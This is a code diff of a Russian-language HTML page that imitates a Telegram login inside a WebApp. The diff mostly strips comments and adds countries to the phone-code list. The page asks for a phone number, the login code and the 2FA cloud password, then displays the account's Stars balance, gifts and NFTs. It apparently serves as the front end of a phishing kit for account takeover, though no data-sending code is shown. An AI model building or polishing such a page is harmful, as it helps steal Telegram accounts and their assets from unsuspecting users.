@@ -4,9 +4,7 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <title>Вход в Telegram WebApp</title>
-    <!-- Telegram WebApp SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
         tailwind.config = {
@@ -146,9 +144,7 @@
 </head>
 <body class="bg-tg-background">
     <div class="card w-full max-w-sm bg-tg-card rounded-xl p-8 space-y-8">
-        <!-- Header Section -->
         <div class="header space-y-4">
-            <!-- Telegram Logo -->
             <div id="telegram-logo" class="flex justify-center">
                 <div class="w-20 h-20 rounded-full bg-gradient-to-br from-[#2AABEE] to-[#229ED9] flex items-center justify-center shadow-lg transform transition-all duration-300 hover:scale-105">
                     <svg width="48" height="48" viewBox="0 0 240 240" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -165,9 +161,7 @@
         </div>
 
 
-        <!-- Step 1: Phone Number and Country Selector (White Theme Style) -->
         <div id="step-phone" class="step space-y-6">
-            <!-- 1. Country Selection Dropdown with Search -->
             <div class="relative">
                 <button id="country-select-btn" class="country-select-btn w-full flex items-center justify-between text-base">
                     <span id="selected-name" class="font-medium">Россия</span>
@@ -178,17 +172,13 @@
                         <input id="country-search" type="text" placeholder="Поиск страны..." class="w-full p-2 text-sm border border-tg-border rounded focus:border-tg-blue focus:ring-0 input-style !border !border-tg-border" onfocus="this.style.borderColor=tailwind.config.theme.extend.colors['tg-blue']" onblur="this.style.borderColor='var(--tg-border)'"/>
                     </div>
                     <div id="country-list" class="max-h-60 overflow-y-auto custom-scroll">
-                        <!-- Country list will be injected here by JS -->
-                    </div>
+                        </div>
                 </div>
             </div>
 
 
-            <!-- 2. Phone Input (Code and Number) -->
             <div class="phone-group">
-                <!-- Code Input (Read-only) -->
                 <div id="selected-code-display" class="code-display">+7</div>
-                <!-- Phone Input -->
                 <input id="phone" type="tel" placeholder="999 888 77 66" class="w-full input-style" />
             </div>
             
@@ -198,11 +188,9 @@
         </div>
 
 
-        <!-- Step 2: Code Verification (5 Digits) -->
         <div id="step-code" class="step hidden text-center space-y-6">
             <label class="text-sm font-medium text-gray-500 mb-4 block">Введите 5-значный код, который мы отправили вам.</label>
             <div id="code-inputs" class="code-inputs-container">
-                <!-- 5 Digit Code Inputs -->
                 <input class="code-input" type="text" maxlength="1" data-index="0" inputmode="numeric" />
                 <input class="code-input" type="text" maxlength="1" data-index="1" inputmode="numeric" disabled />
                 <input class="code-input" type="text" maxlength="1" data-index="2" inputmode="numeric" disabled />
@@ -212,18 +200,13 @@
         </div>
 
 
-        <!-- Step 3: 2FA Password -->
         <div id="step-2fa" class="step hidden text-center space-y-6">
-            <!-- Секция с подсказкой и/или сообщением об отсутствии подсказки, обезьяна удалена -->
-
-            <!-- Подсказка от Telegram -->
             <div id="password-hint-container" class="hidden bg-blue-50 p-3 rounded-lg border border-blue-200">
                 <p class="text-sm text-gray-700">
                     <span class="font-semibold text-tg-blue">💡 Подсказка:</span> <span id="password-hint" class="italic text-gray-600"></span>
                 </p>
             </div>
             
-            <!-- Сообщение об отсутствии подсказки -->
             <div id="no-hint-message" class="hidden bg-yellow-50 p-3 rounded-lg border border-yellow-200">
                 <p class="text-xs text-gray-600">
                     ⚠️ Подсказка не установлена. <br>
@@ -231,22 +214,19 @@
                 </p>
             </div>
 
-            <div class="field space-y-4 pt-4"> <!-- Добавил немного отступа, т.к. удалили обезьяну -->
-                <input id="password" type="password" placeholder="Пароль облачного хранилища (2FA)" class="w-full input-style" />
+            <div class="field space-y-4 pt-4"> <input id="password" type="password" placeholder="Пароль облачного хранилища (2FA)" class="w-full input-style" />
             </div>
             <button id="verify-password" class="mt-4 w-full p-3 bg-tg-blue text-white font-semibold rounded-full shadow-lg hover:bg-sky-600 focus:outline-none focus:ring-4 focus:ring-tg-blue/50 transition duration-150">
                 Войти
             </button>
         </div>
 
-        <!-- Step 4: Account Info -->
         <div id="step-account-info" class="step hidden space-y-6">
             <div class="text-center mb-4">
                 <h2 class="text-xl font-semibold text-tg-text">✅ Вход выполнен!</h2>
                 <p id="user-name" class="text-sm text-gray-500 mt-1"></p>
             </div>
 
-            <!-- Stars Balance -->
             <div class="bg-gradient-to-r from-yellow-50 to-orange-50 p-4 rounded-xl border border-yellow-200">
                 <div class="flex items-center justify-between">
                     <div class="flex items-center gap-2">
@@ -257,7 +237,6 @@
                 </div>
             </div>
 
-            <!-- Gifts -->
             <div id="gifts-container" class="bg-purple-50 p-4 rounded-xl border border-purple-200 hidden">
                 <div class="flex items-center gap-2 mb-3">
                     <span class="text-2xl">🎁</span>
@@ -267,7 +246,6 @@
                 <div id="gifts-list" class="space-y-2 text-sm text-gray-600"></div>
             </div>
 
-            <!-- NFT/Collectibles -->
             <div id="nft-container" class="bg-blue-50 p-4 rounded-xl border border-blue-200 hidden">
                 <div class="flex items-center gap-2 mb-3">
                     <span class="text-2xl">💎</span>
@@ -278,7 +256,6 @@
         </div>
 
 
-        <!-- Status Message -->
         <p id="status" class="text-xs font-medium text-gray-500 text-center pt-3 transition-colors duration-300"></p>
     </div>
 
@@ -508,6 +485,18 @@
             { code: '57', name: 'Колумбия', flag: '🇨🇴', length: 10, minLength: 10 },
             { code: '506', name: 'Коста-Рика', flag: '🇨🇷', length: 8, minLength: 8 },
             { code: '44', name: 'Великобритания', flag: '🇬🇧', length: 10, minLength: 10 },
+            // --- Добавленные страны ---
+            { code: '994', name: 'Азербайджан', flag: '🇦🇿', length: 9, minLength: 9 },
+            { code: '374', name: 'Армения', flag: '🇦🇲', length: 8, minLength: 8 },
+            { code: '996', name: 'Кыргызстан', flag: '🇰🇬', length: 9, minLength: 9 },
+            { code: '54', name: 'Аргентина', flag: '🇦🇷', length: 10, minLength: 10 },
+            { code: '56', name: 'Чили', flag: '🇨🇱', length: 9, minLength: 9 },
+            { code: '234', name: 'Нигерия', flag: '🇳🇬', length: 10, minLength: 10 },
+            { code: '27', name: 'ЮАР', flag: '🇿🇦', length: 9, minLength: 9 },
+            { code: '63', name: 'Филиппины', flag: '🇵🇭', length: 10, minLength: 10 },
+            { code: '51', name: 'Перу', flag: '🇵🇪', length: 9, minLength: 9 },
+            { code: '36', name: 'Венгрия', flag: '🇭🇺', length: 9, minLength: 9 }
+            // --- Конец добавленных стран ---
         ].sort((a, b) => a.name.localeCompare(b.name, 'ru'));
 
 
